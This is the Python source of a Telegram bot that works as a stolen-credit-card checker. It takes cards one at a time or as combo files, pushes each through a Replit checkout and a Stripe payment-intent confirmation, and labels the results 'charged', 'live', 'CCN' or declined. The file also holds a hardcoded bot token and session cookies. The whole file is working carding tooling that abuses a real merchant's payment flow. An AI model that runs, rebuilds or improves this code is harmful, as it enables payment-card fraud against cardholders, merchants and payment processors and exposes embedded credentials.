#pylint:disable=W0602
#pylint:disable=W0621
# pylint:disable=W0703
# pylint:disable=W0603
#——————————————————————#
import os
try:
	import telebot, requests, json, time
except ImportError:
	os.system("pip install telebot requests")
from fake_useragent import UserAgent
#——————————————————————#
iD = ["5894339732", "-1001971321750"]

bot_token = "5929009539:AAG18NDhJ8JzMnh-Kx64Ne0qAq3EG2OI91w"

bot = telebot.TeleBot(bot_token)
print("BoT started")
#——————————————————————#
@bot.message_handler(commands=['full_access'])
def add_access(message):
    sender = message.from_user.id
    if str(sender) == "5894339732":
	    user_id = message.text.split()[1].strip()
	
	    if is_user_allowed(user_id):
	        bot.reply_to(message, "User already has full access.")
	    else:
	        iD.append(user_id)
	        bot.reply_to(message, "User added to the full access list.")
    else:
    	bot.reply_to(message, "Only Admins !")

@bot.message_handler(commands=['remove_access'])
def remove_access(message):
    sender = message.from_user.id
    if str(sender) == "5894339732":
    	
	    user_id = message.text.split()[1].strip()
	
	    if user_id in iD:
	        iD.remove(user_id)
	        bot.reply_to(message, "User removed from the full access list.")
	    else:
	        bot.reply_to(message, "User is not in the full access list.")
    else:
    	bot.reply_to(message, "Only Admins !")
        
@bot.message_handler(commands=['vip_ids'])
def get_full_access_users(message):
    sender = message.from_user.id
    if str(sender) == "5894339732":
    	
	    users_list = []
	    groups_list = []
	
	    for chat_id in iD:
	        try:
	            chat_info = bot.get_chat(chat_id)
	            chat_name = chat_info.title if chat_info.type != 'private' else chat_info.first_name
	            if chat_id.startswith('-'):
	                groups_list.append(f"{chat_id} - {chat_name}")
	            else:
	                users_list.append(f"{chat_id} - {chat_name}")
	        except telebot.apihelper.ApiException:
	            pass
	
	    response = "Users with full access:\n" + "\n".join(users_list)
	    response += "\n\nGroups with full access:\n" + "\n".join(groups_list)
	
	    if len(response) > 0:
	        bot.reply_to(message, response)
	    else:
	        bot.reply_to(message, "No users or groups have full access.")
    else:
    	bot.reply_to(message, "Only Admins !")
#——————————————————————#
def is_user_allowed(user_id):
    allowed_user_ids = [str(id) for id in iD]
    return str(user_id) in allowed_user_ids
#——————————————————————#
is_card_checking = False
session = requests.Session()
#——————————————————————#
cookies_string = """
_ga=GA1.2.888819714.1688847990; stripe_mid=f4069c2d-482c-4333-876e-3e852bdf7a38334fa8; connect.sid=s%3AacA34qZ3Xq5-BTMO5Oc-F7tfPty11Am7.nl4o51VIweJy62tRFAllUv72Hwz41rD5bUycGv99Xxc; replit_authed=1; ajs_user_id=24635724; ajs_anonymous_id=706e3ce9-2cbe-437f-a024-62506a781e6d; cf_bm=symlAfecK3NwJLMmyamgE7fWRibzQFKyXcPUBG7YX60-1689532178-0-AVVgbipeOjzmeFJIvs2rYtWx3lBDKUC7QZ++wSuO1nwN79YaWFGFrLTVMK7f1HvA2U8ds3NQP1LZrKdI0jTni3k=; _cfuvid=eGbQHPV.Su41Guf0Rp8FTdOOdptlt2pch2wpK64XnrM-1689532178841-0-604800000; amplitudeSessionId=1689532183; __stripe_sid=d3b91504-85c3-4c74-a028-0f3d8f1d6b57307eb8; _gid=GA1.2.993937898.1689532211; sidebarClosed=true; _gat=1; _dd_s=logs=1&id=3127a7c2-3fa7-478f-9356-2a093ff3d2e4&created=1689532183877&expire=1689533219877&rum=0
"""

datA = {}

pairs = cookies_string.split("; ")

for pair in pairs:
    if "=" in pair:
        key, value = pair.split("=", 1)
        datA[key.strip()] = value.strip()

cookies_dict = json.loads(json.dumps(datA))  

cookies = requests.cookies.cookiejar_from_dict(cookies_dict)
#——————————————————————#
@bot.message_handler(commands=['update_cookies'])
def handle_update_cookies_command(message):
    sender = message.from_user.id
    if str(sender) == "5894339732":
	    global cookies 
	    command = message.text.split(" ", 1)
	    if len(command) > 1:
	        new_cookies = command[1].strip()
	        
	        datA = {}
	        pairs = new_cookies.split("; ")
	
	        for pair in pairs:
	            if "=" in pair:
	                key, value = pair.split("=", 1)
	                datA[key.strip()] = value.strip()
	
	        cookies_dict = json.loads(json.dumps(datA))  
	        cookies = requests.cookies.cookiejar_from_dict(cookies_dict)
	        
	        cookies_string = "; ".join([f"{key}={value}" for key, value in cookies_dict.items()])
	        
	        bot.reply_to(message, f"Cookies updated successfully.\n\n{cookies_string}")
	    else:
	        bot.reply_to(message, "Please provide the new cookies.")
    else:
    	bot.reply_to(message, "Only Admins !")

@bot.message_handler(commands=['get_cookies'])
def handle_get_cookies_command(message):
    
    sender = message.from_user.id
    if str(sender) == "5894339732":
    	
	    global cookies  
	    
	    cookies_string = "; ".join([f"{key}={value}" for key, value in cookies.items()])
	
	    bot.reply_to(message, f"Current Cookies:\n\n{cookies_string}")
    else:
    	bot.reply_to(message, "Only Admins !")
#——————————————————————#
@bot.message_handler(commands=['help'])
def handle_help_command(message):
	
	bot.reply_to(message, "You Can Ask For Help From The Admins ⟹ @M_408")
	
@bot.message_handler(commands=['start'])
def handle_start_command(message):
	chat_id = message.chat.id
	first_name = message.from_user.first_name
	reply_message = f"Hello {first_name} in Chaecker BoT\n\nSend: /chk  ⟺  /file\n\n" \
                    f"Bot by: <a href='tg://user?id=5894339732'>Mostafa</a>"

	photo_path = "3.jpg"
	photo = open(photo_path, 'rb')
	
	bot.send_photo(chat_id, photo, caption=reply_message, parse_mode='html')


@bot.message_handler(commands=['chk'])
def handle_check_command(message):
	try:
		chat_id = message.chat.id
		initial_message = bot.reply_to(message, "I got the card, give me 1sec to check it")
		card_details = message.text.split(' ')[1]
		card_data = card_details.split('|')
		cc, mes, ano, cvv = map(str.strip, card_data)
		card = f"{cc}|{mes}|{ano}|{cvv}"
		
	    
		
		ua = UserAgent()
		random_user_agent = ua.random
		
		headers = {
	    'authority': 'replit.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://replit.com',
	    'referer': 'https://replit.com/cycles',
	    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': random_user_agent,
	    'x-client-version': 'ac1050a',
	    'x-forwarded-host': 'replit.com',
	    'x-requested-with': 'XMLHttpRequest',
		}
		
		json_data = [
	    {
	        'operationName': 'CreateReplitOneTimeCheckoutSession',
	        'variables': {
	            'input': {
	                'cyclesQuantity': 1000,
	                'customerName': 'Mostafa Ashry ',
	            },
	        },
	        'query': 'mutation CreateReplitOneTimeCheckoutSession($input: CreateReplitOneTimeCheckoutSessionInput!) {\n  createReplitOneTimeCheckoutSession(input: $input) {\n    ... on CreateReplitOneTimeCheckoutSessionResult {\n      checkoutSession {\n        id\n        status\n        __typename\n      }\n      clientSecret\n      currentUser {\n        id\n        paymentMethod {\n          ... on PaymentMethod {\n            ...UserPaymentMethod\n            __typename\n          }\n          __typename\n        }\n        cyclesAutoRefillConfiguration {\n          ... on CyclesAutoRefillConfiguration {\n            ...AutoRefillConfig\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    ... on UserError {\n      message\n      __typename\n    }\n    ... on UnauthorizedError {\n      message\n      __typename\n    }\n    ... on PaymentError {\n      message\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment UserPaymentMethod on PaymentMethod {\n  id\n  last4\n  __typename\n}\n\nfragment AutoRefillConfig on CyclesAutoRefillConfiguration {\n  id\n  enabled\n  refillAmount\n  monthlyBudget\n  __typename\n}\n',
	    },
	]
		response = session.post('https://replit.com/graphql', cookies=cookies, headers=headers, json=json_data)
		response_data = response.json()
		client_secret = response_data[0]['data']['createReplitOneTimeCheckoutSession']['clientSecret']
		pi = client_secret.split("_secret_")[0]
		
	#——–———–—————————–—————–#
		url = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"
		data = {
	    "return_url": "https://replit.com/cycles",
	    "payment_method_data[billing_details][name]": "Mostafa Ashry",
	    "payment_method_data[billing_details][address][country]": "EG",
	    "payment_method_data[type]": "card",
	    "payment_method_data[card][number]": cc,
	    "payment_method_data[card][cvc]": cvv,
	    "payment_method_data[card][exp_year]": ano,
	    "payment_method_data[card][exp_month]": mes,
	    "payment_method_data[payment_user_agent]": "stripe.js/e788aede38; stripe-js-v3/e788aede38; payment-element; deferred-intent",
	    "payment_method_data[time_on_page]": "47403",
	    "payment_method_data[guid]": "NA",
	    "payment_method_data[muid]": "NA",
	    "payment_method_data[sid]": "NA",
	    "expected_payment_method_type": "card",
	    "client_context[currency]": "usd",
	    "client_context[mode]": "payment",
	    "client_context[setup_future_usage]": "off_session",
	    "client_context[payment_method_types][0]": "card",
	    "use_stripe_sdk": "true",
	    "key": "pk_live_515YpNsJAmnYVOvfnsBqRdATWS6SzbNAslOz1z2tujdKuvRMDAwWMeFXp6dJL1YKRrQjB0WAp0UDGwlFYL7hxw7Fc00QkfxBFsL",
	    "client_secret": client_secret
		}
		
		response = session.post(url, data=data)
		result = response.text
		response_data = result
		
		if "Your card was declined." in response.text or "incorrect_number" in response.text or "Your card's expiration month is invalid." in response.text or "Error updating default payment method. Your card was declined." in response.text or "Card is declined by your bank, please contact them for additional information." in response.text:
			
			try:
			        if isinstance(response_data, list):
			        	error_message = response_data[0]['error']['message']
			        	msg_text = str(error_message)
			        else:
			        	raise IndexError
			except (KeyError, IndexError):
			    msg_text = "Your card was declined."
			except Exception as e:
			    print(type(response_data))
			    print(e)
			    msg_text = "Your card was declined."
	
	
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : Daed ❌
	⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
	⌬ ɢᴀᴛᴇᴡᴀʏ : STRIPE AUTH 
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "incorrect_zip" in response.text:
			msg_text = "incorrect_zip"
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : Daed ❌
	⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
	⌬ ɢᴀᴛᴇᴡᴀʏ : STRIPE AUTH 
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "Security code is incorrect" in response.text or "incorrect_cvc" in response.text or "security code is incorrect." in response.text or "security code is invalid." in response.text or "Your card's security code is incorrect" in response.text:
			
			try:
			        if isinstance(response_data, list):
			        	error_message = response_data[0]['error']['message']
			        	msg_text = str(error_message)
			        else:
			        	raise IndexError
			except (KeyError, IndexError):
			    msg_text = "Your card's security code is incorrect"
			except Exception as e:
			    print(type(response_data))
			    print(e)
			    msg_text = "Your card's security code is incorrect"
	
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : APPRPVED ⟹ CNN ✅
	⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
	⌬ ɢᴀᴛᴇᴡᴀʏ : STRIPE AUTH 
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "Your card has insufficient funds." in response.text:
			msg_text = "Your card has insufficient funds."
			
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : APPRPVED ✅
	⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
	⌬ ɢᴀᴛᴇᴡᴀʏ : STRIPE AUTH 
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a> 』══
	"""
	
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "succeeded" in response.text or "Membership Confirmation" in response.text or "Thank you for your support!" in response.text or "Thank you for your donation" in response.text or "/wishlist-member/?reg=" in response.text or "Thank You" in response.text:
			msg_text = "succeeded"
			
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : CHARGED ✅
	⌬ ʀᴇsᴘᴏɴsᴇ : succeeded
	⌬ ɢᴀᴛᴇᴡᴀʏ : STRIPE AUTH 
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "transaction_not_allowed" in response.text or "Your card is not supported." in response.text or '"cvc_check": "pass"' in response.text or "Your card does not support this type of purchase." in response.text:
			print(response_data)
			try:
			        response_data = json.loads(response_data)
			        if isinstance(response_data, list):
			        	error_message = response_data[0]['error']['message']
			        	msg_text = str(error_message)
			        elif isinstance(response_data, dict):
			        	if 'error' in response_data and 'message' in response_data['error']:
			        		error_message = response_data['error']['message']
			        	else:
			        		raise KeyError
			        else:
			        	raise TypeError
			except (KeyError, IndexError):
			    msg_text = "transaction_not_allowed"
			except (TypeError, json.JSONDecodeError):
			    error_message = "Invalid response data"
			except Exception as e:
			    print(type(response_data))
			    print(e)
			    msg_text = "transaction_not_allowed"
			
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : APPRPVED ✅
	⌬ ʀᴇsᴘᴏɴsᴇ : {error_message}
	⌬ ɢᴀᴛᴇᴡᴀʏ : STRIPE AUTH 
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif """"next_action": {
	    "type": "use_stripe_sdk",""" in response.text or "stripe_3ds2_fingerprint" in response.text:
			msg_text = "OTP"
			messag = f"""
	═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a>  ]═════
	
	⌬ ᴄᴀʀᴅ : {card}
	⌬ sᴛᴀᴛᴜs : OTP ❌
	⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
	⌬ ɢᴀᴛᴇᴡᴀʏ : STRIPE AUTH 
	
	══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a> 』══
	
	"""
			bot.edit_message_text(messag, chat_id, initial_message.message_id,parse_mode='html')
	#——————————————————————#
		elif "lock_timeout" in response.text:
			bot.send_message(chat_id=message.chat.id,text="Try Again")
	#——————————————————————#
		else:
			msg_text = "UnKnown"
			bot.send_message(chat_id=message.chat.id,text=f"Hi, I Got Card With Unknown response:\n{card}")
			print(response.text)
			print("="*60)
	except IndexError:
	   bot.edit_message_text("The Card Is Not in This Format\nXXXXXXXXXXXXXXXX|XX|XXXX|XXX", chat_id, initial_message.message_id)
	   
#——————————————————————#
@bot.message_handler(commands=['file'])
def handle_fill_command(message):
	if not is_user_allowed(message.chat.id):
		bot.reply_to(message, "Fuck you, Go Ask for Access From Admin @M_408 , @P_Q_Z")
		return
	photo_path = "2.jpg"
	photo = open(photo_path, 'rb')
	text = "Please send the combo file."
	bot.send_photo(chat_id=message.chat.id, caption=text, photo=photo)

	global is_card_checking
	is_card_checking = True


	@bot.message_handler(content_types=['document'])
	def handle_card_file(message):
	    try:
	        file_id = message.document.file_id
	        file_info = bot.get_file(file_id)
	        file_path = file_info.file_path
	
	        cards = []
	
	        downloaded_file = bot.download_file(file_path)
	
	        file_content = downloaded_file.decode('utf-8')
	        card_lines = file_content.strip().split('\n')
	
	        for line in card_lines:
	            card_data = line.strip().split('|')
	
	            if len(card_data) != 4:
	                
	                continue
	
	            cc, mes, ano, cvv = map(str.strip, card_data)
	            cards.append((cc, mes, ano, cvv))
	
	        check_cards_from_file(message, cards)
	
	    except Exception as e:
	        bot.reply_to(message, "An error occurred while checking the cards.\nPleas Check The Cookies of Your Account And Check Again")
	        print(str(e))
	        
	def check_cards_from_file(message, cards):
	    try:
	        not_working_cards = []
	        working_cards = []
	        cards_3D_secure = []
	        insufficient_founds = []
	        ccn_cards = []
	        live_cards = []
	
	        text = "I'm checking, please wait..."
	        msg = bot.send_message(chat_id=message.chat.id,text=text)
	
	        for cc, mes, ano, cvv in cards:
	            if not is_card_checking:
	                break
	                
	            if (int(ano)) < 100:
	                if (int(ano)) < 23:
	                    pass
	            elif (int(ano)) < 2023:
	               pass

	
	            msg_text = "None"
	            card = f"{cc}|{mes}|{ano}|{cvv}"
	            

	            ua = UserAgent()
	            random_user_agent = ua.random
	            
	            headers = {
    'authority': 'replit.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
    'content-type': 'application/json',
    'origin': 'https://replit.com',
    'referer': 'https://replit.com/cycles',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': random_user_agent,
    'x-client-version': 'ac1050a',
    'x-forwarded-host': 'replit.com',
    'x-requested-with': 'XMLHttpRequest',
}
	            json_data = [
    {
        'operationName': 'CreateReplitOneTimeCheckoutSession',
        'variables': {
            'input': {
                'cyclesQuantity': 1000,
                'customerName': 'Mostafa Ashry ',
            },
        },
        'query': 'mutation CreateReplitOneTimeCheckoutSession($input: CreateReplitOneTimeCheckoutSessionInput!) {\n  createReplitOneTimeCheckoutSession(input: $input) {\n    ... on CreateReplitOneTimeCheckoutSessionResult {\n      checkoutSession {\n        id\n        status\n        __typename\n      }\n      clientSecret\n      currentUser {\n        id\n        paymentMethod {\n          ... on PaymentMethod {\n            ...UserPaymentMethod\n            __typename\n          }\n          __typename\n        }\n        cyclesAutoRefillConfiguration {\n          ... on CyclesAutoRefillConfiguration {\n            ...AutoRefillConfig\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    ... on UserError {\n      message\n      __typename\n    }\n    ... on UnauthorizedError {\n      message\n      __typename\n    }\n    ... on PaymentError {\n      message\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment UserPaymentMethod on PaymentMethod {\n  id\n  last4\n  __typename\n}\n\nfragment AutoRefillConfig on CyclesAutoRefillConfiguration {\n  id\n  enabled\n  refillAmount\n  monthlyBudget\n  __typename\n}\n',
    },
]
	          
	            
	            response = session.post('https://replit.com/graphql', cookies=cookies, headers=headers, json=json_data)
	            response_data = response.json()
	            
	            client_secret = response_data[0]['data']['createReplitOneTimeCheckoutSession']['clientSecret']
	            
	            
	            pi = client_secret.split("_secret_")[0]
	            
	            url = f"https://api.stripe.com/v1/payment_intents/{pi}/confirm"
	            
	            
	            data = {
    "return_url": "https://replit.com/cycles",
    "payment_method_data[billing_details][name]": "Mostafa Ashry",
    "payment_method_data[billing_details][address][country]": "EG",
    "payment_method_data[type]": "card",
    "payment_method_data[card][number]": cc,
    "payment_method_data[card][cvc]": cvv,
    "payment_method_data[card][exp_year]": ano,
    "payment_method_data[card][exp_month]": mes,
    "payment_method_data[payment_user_agent]": "stripe.js/e788aede38; stripe-js-v3/e788aede38; payment-element; deferred-intent",
    "payment_method_data[time_on_page]": "47403",
    "payment_method_data[guid]": "NA",
    "payment_method_data[muid]": "NA",
    "payment_method_data[sid]": "NA",
    "expected_payment_method_type": "card",
    "client_context[currency]": "usd",
    "client_context[mode]": "payment",
    "client_context[setup_future_usage]": "off_session",
    "client_context[payment_method_types][0]": "card",
    "use_stripe_sdk": "true",
    "key": "pk_live_515YpNsJAmnYVOvfnsBqRdATWS6SzbNAslOz1z2tujdKuvRMDAwWMeFXp6dJL1YKRrQjB0WAp0UDGwlFYL7hxw7Fc00QkfxBFsL",
    "client_secret": client_secret
}
    
	            response = session.post(url, data=data)
	            
	            result = response.text
	            response_data = result
#——–————–——————–———————#
	            if "Your card was declined." in response.text or "incorrect_number" in response.text or "Your card's expiration month is invalid." in response.text or "Error updating default payment method. Your card was declined." in response.text or "Card is declined by your bank, please contact them for additional information." in response.text:
	            	
	            				try:
	            					response_data = json.loads(response_data)
	            					if isinstance(response_data, list):
	            						error_message = response_data[0]['error']['message']
	            						msg_text = str(error_message)
	            					elif isinstance(response_data, dict):
	            						if 'error' in response_data and 'message' in response_data['error']:
	            							error_message = response_data['error']['message']
	            							msg_text = str(error_message)
	            						else:
	            							raise KeyError
	            					else:
	            						raise TypeError
	            				except (KeyError, IndexError):
	            					msg_text = "Your card was declined."
	            				except (TypeError, json.JSONDecodeError):
	            					error_message = "Unkwon response data"
	            				except Exception as e:
	            					print(type(response_data))
	            					print(e)
	            					msg_text = "Your card was declined."
	            				not_working_cards.append(card)
#——————————————————————#
	            elif "incorrect_zip" in response.text:
	            	msg_text = "incorrect_zip"
	            	not_working_cards.append(card)
#——————————————————————#
	            elif "Your card's security code is incorrect" in response.text or "security code is invalid." in response.text or "security code is incorrect." in response.text or "Security code is incorrect" in response.text or "incorrect_cvc" in response.text:
	            	
	            				try:
	            					response_data = json.loads(response_data)
	            					if isinstance(response_data, list):
	            						error_message = response_data[0]['error']['message']
	            						msg_text = str(error_message)
	            					elif isinstance(response_data, dict):
	            						if 'error' in response_data and 'message' in response_data['error']:
	            							error_message = response_data['error']['message']
	            							msg_text = str(error_message)
	            						else:
	            							raise KeyError
	            					else:
	            						raise TypeError
	            				except (KeyError, IndexError):
	            					msg_text = "Your card's security code is incorrect"
	            				except (TypeError, json.JSONDecodeError):
	            					error_message = "Unkwon response data"
	            				except Exception as e:
	            					print(type(response_data))
	            					print(e)
	            					msg_text = "Your card's security code is incorrect"
		    
	            				ccn_cards.append(card)
	            				messag = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a>  ]═════

⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ⟹ CNN  ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : STRIPE AUTH 

══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a> 』══

"""
	            				bot.send_message(chat_id=message.chat.id,text=messag,parse_mode='html')
#—————————INSUFF—————————#
	            elif "Your card has insufficient funds." in response.text:
	                msg_text = "Your card has insufficient funds."
	                insufficient_founds.append(card)
	                messag = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a>  ]═════

⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {msg_text}
⌬ ɢᴀᴛᴇᴡᴀʏ : STRIPE AUTH 

══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a> 』══

"""
	                bot.send_message(chat_id=message.chat.id,text=messag,parse_mode='html')
#————————CHARGED–——–—–———#
	            elif "succeeded" in response.text or "Membership Confirmation" in response.text or "Thank you for your support!" in response.text or "Thank you for your donation" in response.text or "/wishlist-member/?reg=" in response.text or "Thank You" in response.text:
	                
	                working_cards.append(card)
	                messag = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a>  ]═════

⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : CHARGED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : succeeded
⌬ ɢᴀᴛᴇᴡᴀʏ : STRIPE AUTH 

══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a> 』══

"""
	                bot.send_message(chat_id=message.chat.id,text=messag,parse_mode='html')
#———————LIVE CARDS————————#
	            elif "transaction_not_allowed" in response.text or "Your card is not supported." in response.text or '"cvc_check": "pass"' in response.text or "Your card does not support this type of purchase." in response.text:
	            	
	            				try:
	            					response_data = json.loads(response_data)
	            					if isinstance(response_data, list):
	            						error_message = response_data[0]['error']['message']
	            						msg_text = str(error_message)
	            					elif isinstance(response_data, dict):
	            						if 'error' in response_data and 'message' in response_data['error']:
	            							error_message = response_data['error']['message']
	            							msg_text = str(error_message)
	            						else:
	            							raise KeyError
	            					else:
	            						raise TypeError
	            				except (KeyError, IndexError):
	            					msg_text = "Your card does not support this type of purchase."
	            				except (TypeError, json.JSONDecodeError):
	            					error_message = "Unkwon response data"
	            				except Exception as e:
	            					print(type(response_data))
	            					print(e)
	            					msg_text = "Your card does not support this type of purchase."
	            				live_cards.append(card)
	            				messag = f"""
═════[ َِ  <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a>  ]═════

⌬ ᴄᴀʀᴅ : {card}
⌬ sᴛᴀᴛᴜs : APPRPVED ✅
⌬ ʀᴇsᴘᴏɴsᴇ : {str(msg_text)}
⌬ ɢᴀᴛᴇᴡᴀʏ : STRIPE AUTH 

══『 𝗕𝗢𝗧 𝗕𝗬 - <a href='tg://user?id=5894339732'> 𝐌𝐎𝐒𝐓𝐀𝐅𝐀 🖤</a> 』══

"""
	            				bot.send_message(chat_id=message.chat.id,text=messag,parse_mode='html')
#——————————————————————#
	            elif """"next_action": {
    "type": "use_stripe_sdk",""" in response.text or "stripe_3ds2_fingerprint" in response.text:
	                msg_text = "OTP"
	                cards_3D_secure.append(card)
#——————————————————————#
	            elif "lock_timeout" in response.text:
	                time.sleep(1)
#——————————————————————#
	            else:
	                msg_text = "UnKnown"
	                bot.send_message(chat_id=message.chat.id,text=f"Hi, I Got Card With Unknown response:\n{card}")
	                
	                print(response.text)
	                print("="*60)
#——————————————————————#
	            reply_markup = create_reply_markup(card, len(not_working_cards),len(live_cards), len(working_cards), len(cards_3D_secure) ,len(insufficient_founds),len(ccn_cards),msg_text,len(cards))
	            try:
	                bot.edit_message_text(
	                    chat_id=message.chat.id,
	                    message_id=msg.message_id,
	                    text="Checking in progress Wait...",
	                    reply_markup=reply_markup
	                )
	            except telebot.apihelper.ApiTelegramException:
	                time.sleep(2)
	    except Exception as e:
	        bot.reply_to(message, "An error occurred while checking the cards.\nPleas Check The Cookies of Your Account And Come Back for Checking")
	        print(str(e))
#——————————————————————#
	def create_reply_markup(current_card, num_not_working, num_live, num_working,  num_cards_3D_secure, num_insufficient_founds, num_ccn, message_text, All):
	    markup = telebot.types.InlineKeyboardMarkup()
	
	    current_card_button = telebot.types.InlineKeyboardButton(text=f"⌜ • {current_card} • ⌝", callback_data="current_card")
	    
	    message_button = telebot.types.InlineKeyboardButton(text=f" ⌯ {message_text} ⌯ ", callback_data="message")
	    
	    working_button = telebot.types.InlineKeyboardButton(text=f"Charged: {num_working}", callback_data="working")

	    live_button = telebot.types.InlineKeyboardButton(text=f"Live: {num_live}", callback_data="live")
	    
	    insufficient_button = telebot.types.InlineKeyboardButton(text=f"Insuff Founds: {num_insufficient_founds}", callback_data="no thing")
	    
	    ccn_button = telebot.types.InlineKeyboardButton(text=f"CCN: {num_ccn}", callback_data="no thing")
		    
	    all_button = telebot.types.InlineKeyboardButton(text=f"⌞ • All: {All} ┇ Declined: {num_not_working} ┇2-AF: {num_cards_3D_secure} • ⌟", callback_data="no thing")
	
	    stop_button = telebot.types.InlineKeyboardButton(text="〄 STOP 〄", callback_data="stop")
	
	    markup.row(current_card_button)
	    markup.row(message_button)
	    markup.row(working_button,live_button)
	    markup.row(insufficient_button,ccn_button)
	    markup.row(all_button)
	    markup.row(stop_button)
	
	    return markup
	
	@bot.callback_query_handler(func=lambda call: True)
	def handle_callback_query(call):
	    if call.data == "stop":
	        global is_card_checking
	        is_card_checking = False
	        bot.answer_callback_query(call.id, text="Card checking stopped.")
	
bot.polling()